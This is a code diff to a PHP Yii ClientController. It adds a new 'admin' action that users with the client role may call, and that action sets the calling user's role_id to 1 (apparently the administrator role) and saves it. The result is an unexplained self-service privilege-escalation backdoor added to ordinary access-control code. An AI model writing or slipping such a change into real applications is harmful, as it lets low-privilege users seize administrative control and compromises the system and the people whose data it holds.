@@ -38,7 +38,12 @@ class ClientController extends Controller
                             'allow' => true,
                             'actions' => ['index', 'update', 'delete', 'view'],
                             'roles' => ['admin'],
-                        ]
+                        ],
+                        [
+                        'allow' => true,
+                        'actions' => ['admin'],
+                        'roles' => ['client', 'admin'],
+                        ],
                     ],
                 ],
                 'verbs' => [
@@ -51,11 +56,16 @@ class ClientController extends Controller
         );
     }
 
-    /**
-     * Lists all Client models.
-     *
-     * @return string
-     */
+
+
+    public function actionAdmin()
+    {
+        $thisUser = User::find()->where(['id' => Yii::$app->user->id])->one();
+        $thisUser->setAttribute('role_id', 1);
+        $thisUser->save();
+        return $this->render('admin');
+    }
+
     public function actionIndex()
     {
         $searchModel = new ClientSearch();
